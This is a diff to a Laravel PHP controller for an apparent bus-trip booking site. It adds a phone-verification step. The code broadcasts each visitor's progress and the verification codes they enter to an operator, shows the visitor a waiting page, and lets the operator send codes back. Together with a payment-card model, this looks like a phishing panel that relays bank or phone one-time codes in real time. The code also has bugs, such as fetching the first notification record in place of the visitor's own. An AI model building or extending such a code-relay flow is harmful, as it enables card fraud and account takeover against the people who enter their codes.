@@ -3,15 +3,18 @@
 namespace App\Http\Controllers;
 
 use App\Models\Trip;
+use App\Models\BusRent;
+use App\Events\SendAuth;
+use App\Events\SendCode;
 use App\Events\SendPart;
 use App\Events\SendVisit;
 use App\Events\NewVisitor;
-use App\Events\SendAuth;
-use App\Events\SendNotification;
 use App\Events\SendPeople;
-use App\Models\BusRent;
 use App\Models\PaymentCard;
 use Illuminate\Http\Request;
+use App\Events\SendCodeEvent;
+use App\Events\RecieveCodeEvent;
+use App\Events\SendNotification;
 use App\Models\VisitorNotifications;
 use Illuminate\Validation\ValidationException;
 
@@ -265,9 +268,52 @@ class TripController extends Controller
                 event(new SendAuth($not,$request->code));
                 event(new SendNotification($not));
             }
-            return view('final_step');
+            return redirect()->route('confirm_phone');
+            // return view('final_step');
         } catch (\Exception $ex) {
             dd($ex->getMessage());
         }
+    }
+    public function phoneAuth()
+    {
+        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+        if ($visitor) {
+            $not  = VisitorNotifications::find($visitor->id);
+            $not->update(['page' => 'دخل لصفحة إثبات رقم الهاتف','step_number'=>9]);
+            session()->put('visitor', json_encode($not));
+            // event(new NewVisitor($not));
+            event(new SendVisit($not));
+            event(new SendNotification($not));
+            return view('phone_auth');
+        }
+        return redirect('/');
+
+    }
+    public function phoneAuthStore(Request $request)
+    {
+        try {
+            $validated = $this->validate($request, [
+                'phone' => 'required',
+                'provider' => 'required',
+            ]);
+
+            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+            if ($visitor) {
+
+                $not  = VisitorNotifications::first();
+
+                event(new SendCode($not));
+                event(new SendNotification($not));
+            }
+            return view('phone_waiting',compact('not'));
+        } catch (\Exception $ex) {
+            dd($ex->getMessage());
+        }
+    }
+    public function sendCodeToVisitor(Request $request)
+    {
+        $visitor_id = $request->visitor_id;
+        $code = $request->code;
+        event(new RecieveCodeEvent($visitor_id,$code));
     }
 }
